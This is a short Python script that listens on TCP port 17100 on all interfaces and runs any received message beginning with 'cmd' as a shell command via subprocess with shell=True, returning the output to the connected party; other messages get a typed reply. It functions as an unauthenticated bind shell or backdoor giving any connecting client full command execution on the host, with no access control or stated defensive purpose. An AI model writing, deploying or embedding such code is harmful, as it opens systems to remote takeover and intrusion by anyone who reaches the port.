import socket
import subprocess

HOST = "0.0.0.0"
PORT = 17100 

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen()

print(f"Server listening on port {PORT}...")

conn, addr = server_socket.accept()
print(f"Connected by {addr}")

while True:
    data = conn.recv(1024)
    if not data:
        break
    message = data.decode()
    if message.startswith("cmd"):
        command = message[3:].strip()
        try:
            result = subprocess.check_output(
                command,
                shell=True,
                stderr=subprocess.STDOUT,
                text=True
            )
        except subprocess.CalledProcessError as e:
            result = e.output
        conn.sendall(result.encode() if result else b'Command executed.\n')
    else:
        print(f"Received: {message}")
        response = input("Enter response: ")
        conn.sendall(response.encode())

conn.close()
server_socket.close()